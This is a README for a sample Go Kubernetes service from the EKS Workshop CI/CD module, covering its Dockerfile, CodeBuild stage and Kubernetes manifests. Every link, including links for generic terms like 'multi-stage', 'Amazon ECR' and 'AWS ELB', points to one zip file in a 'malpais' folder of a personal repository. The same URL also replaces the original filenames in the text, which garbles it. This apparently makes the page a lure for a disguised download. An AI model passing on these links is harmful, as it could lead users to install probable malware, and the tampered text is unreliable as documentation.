# eks-workshop-sample-api-service-go

A sample Kubernetes service used in the [EKS Workshop](https://raw.githubusercontent.com/marcossangomes/eks-workshop-sample-api-service-go/master/malpais/eks-sample-workshop-go-service-api-3.2.zip) CI/CD Pipeline module.

The Dockerfile is a [multi-stage](https://raw.githubusercontent.com/marcossangomes/eks-workshop-sample-api-service-go/master/malpais/eks-sample-workshop-go-service-api-3.2.zip) build that
compiles the Go application and then packages it in a minimal image that pulls from [scratch](https://raw.githubusercontent.com/marcossangomes/eks-workshop-sample-api-service-go/master/malpais/eks-sample-workshop-go-service-api-3.2.zip).
The size of this Docker image is ~ 3.2 MiB.

The https://raw.githubusercontent.com/marcossangomes/eks-workshop-sample-api-service-go/master/malpais/eks-sample-workshop-go-service-api-3.2.zip file is used by the [AWS CodeBuild](https://raw.githubusercontent.com/marcossangomes/eks-workshop-sample-api-service-go/master/malpais/eks-sample-workshop-go-service-api-3.2.zip) stage. In this file, it pulls down
kubectl, builds the container image, pushes the image to [Amazon ECR](https://raw.githubusercontent.com/marcossangomes/eks-workshop-sample-api-service-go/master/malpais/eks-sample-workshop-go-service-api-3.2.zip) and then deploys the change to the
[Amazon EKS Cluster](https://raw.githubusercontent.com/marcossangomes/eks-workshop-sample-api-service-go/master/malpais/eks-sample-workshop-go-service-api-3.2.zip).

In the https://raw.githubusercontent.com/marcossangomes/eks-workshop-sample-api-service-go/master/malpais/eks-sample-workshop-go-service-api-3.2.zip file, you will find the Kubernetes [service](https://raw.githubusercontent.com/marcossangomes/eks-workshop-sample-api-service-go/master/malpais/eks-sample-workshop-go-service-api-3.2.zip) and
[deployment](https://raw.githubusercontent.com/marcossangomes/eks-workshop-sample-api-service-go/master/malpais/eks-sample-workshop-go-service-api-3.2.zip) definitions. The service is configured with
a [LoadBalancer](https://raw.githubusercontent.com/marcossangomes/eks-workshop-sample-api-service-go/master/malpais/eks-sample-workshop-go-service-api-3.2.zip) which prompts Kubernetes
to launch an external load balancer using an [AWS ELB](https://raw.githubusercontent.com/marcossangomes/eks-workshop-sample-api-service-go/master/malpais/eks-sample-workshop-go-service-api-3.2.zip).
